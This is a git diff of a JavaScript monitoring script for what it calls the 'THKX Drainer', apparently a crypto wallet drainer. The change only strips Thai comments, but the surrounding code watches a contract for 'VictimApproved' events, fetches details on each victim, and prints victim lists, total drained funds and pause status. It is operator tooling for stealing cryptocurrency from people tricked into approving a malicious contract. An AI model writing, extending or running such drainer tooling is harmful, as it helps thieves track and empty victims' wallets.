@@ -47,7 +47,7 @@ async function getVictimDetails(victim) {
     }
 }
 
-// เพิ่มฟังก์ชันสำหรับเคลียร์เทอร์มินัล
+
 function clearConsole() {
     process.stdout.write('\x1Bc');
 }
@@ -55,7 +55,7 @@ function clearConsole() {
 async function initMonitoring() {
     try {
         lastBlockChecked = await provider.getBlockNumber();
-        clearConsole(); // เคลียร์เทอร์มินัลก่อนแสดงข้อมูลเริ่มต้น
+        clearConsole();
         console.log('\n🔥 THKX Drainer Monitoring System 🔥');
         console.log('=================================================================');
         console.log(`🌐 Network: ${(await provider.getNetwork()).name}`);
@@ -81,7 +81,7 @@ async function initMonitoring() {
                 const events = await contract.queryFilter("VictimApproved", fromBlock, toBlock);
 
                 if (events.length > 0) {
-                    clearConsole(); // เคลียร์เทอร์มินัลก่อนแสดงข้อมูล victim ใหม่
+                    clearConsole(); 
                     for (const event of events) {
                         const victim = event.args.victim;
                         const victimDetails = await getVictimDetails(victim);
@@ -116,7 +116,7 @@ async function initMonitoring() {
 
         setInterval(async () => {
             try {
-                clearConsole(); // เคลียร์เทอร์มินัลก่อนแสดง status report
+                clearConsole();
                 const victims = await contract.getVictims();
                 const drained = await contract.getTotalDrained();
                 const paused = await contract.isPaused();
